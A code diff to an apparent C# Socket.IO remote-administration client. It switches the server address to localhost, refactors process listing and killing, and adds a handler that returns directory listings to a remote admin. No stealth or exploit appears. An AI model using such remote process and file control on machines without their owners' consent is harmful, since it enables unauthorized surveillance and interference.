@@ -14,7 +14,7 @@ namespace Client
 
         static void Main(string[] args)
         {
-            socket = IO.Socket("http://192.168.137.1:6777", new IO.Options
+            socket = IO.Socket("http://localhost:6777", new IO.Options
             {
                 ExtraHeaders = new Dictionary<string, string>
                 {
@@ -41,7 +41,7 @@ namespace Client
 
             try
             {
-                list = Engine.ListProcesses();
+                list = Engine.Instance.ListProcesses();
             }
             catch (Exception e)
             {
@@ -67,12 +67,39 @@ namespace Client
 
             try
             {
-                Engine.KillProcess(obj.processId);
+                Engine.Instance.KillProcess(obj.processId);
             }
             catch (Exception e)
             {
                 Log(obj.CallbackAdminId, e.Message, e.TargetSite == null ? null : e.TargetSite.Name);
                 return;
+            }
+        }
+
+        private static void OnDirectoryOrFileRequest(object data)
+        {
+            var obj = JsonConvert.DeserializeAnonymousType(data.ToString(), new { Path = "", CallbackAdminId = "" });
+
+            var list = new List<DirectoryOrFile>();
+
+            try
+            {
+                list = Engine.Instance.ListDirectoryOrFile(obj.Path);
+            }
+            catch (Exception e)
+            {
+                Log(obj.CallbackAdminId, e.Message, e.TargetSite == null ? null : e.TargetSite.Name);
+                return;
+            }
+
+            lock (socket)
+            {
+                socket.Emit("files", JsonConvert.SerializeObject(new
+                {
+                    List = list,
+                    Path = obj.Path,
+                    CallbackAdminId = obj.CallbackAdminId
+                }));
             }
         }
 
